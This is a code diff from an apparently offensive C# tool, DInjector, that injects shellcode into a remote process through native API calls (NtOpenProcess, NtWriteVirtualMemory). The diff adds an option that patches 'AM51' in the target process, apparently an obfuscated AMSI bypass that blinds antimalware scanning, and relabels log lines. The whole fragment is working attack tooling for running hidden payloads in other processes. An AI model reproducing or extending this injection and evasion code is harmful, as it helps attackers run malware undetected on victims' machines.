@@ -9,7 +9,7 @@ namespace DInjector
 {
     class RemoteThreadDll
     {
-        public static void Execute(byte[] shellcode, int processID, string moduleName)
+        public static void Execute(byte[] shellcode, int processID, string moduleName, bool remoteAm51)
         {
             #region NtOpenProcess
 
@@ -27,6 +27,8 @@ namespace DInjector
                 Console.WriteLine("(RemoteThreadDll) [+] NtOpenProcess");
             else
                 throw new Exception($"(RemoteThreadDll) [-] NtOpenProcess: {ntstatus}");
+
+            if (remoteAm51) AM51.Patch(hProcess, processID);
 
             #endregion
 
@@ -57,7 +59,7 @@ namespace DInjector
 
                     #endregion
 
-                    #region NtWriteVirtualMemory
+                    #region NtWriteVirtualMemory (shellcode)
 
                     var buffer = Marshal.AllocHGlobal(shellcode.Length);
                     Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
@@ -72,9 +74,9 @@ namespace DInjector
                         ref bytesWritten);
 
                     if (ntstatus == NTSTATUS.Success)
-                        Console.WriteLine("(RemoteThreadDll) [+] NtWriteVirtualMemory");
+                        Console.WriteLine("(RemoteThreadDll) [+] NtWriteVirtualMemory, shellcode");
                     else
-                        throw new Exception($"(RemoteThreadDll) [-] NtWriteVirtualMemory: {ntstatus}");
+                        throw new Exception($"(RemoteThreadDll) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
 
                     Marshal.FreeHGlobal(buffer);
 
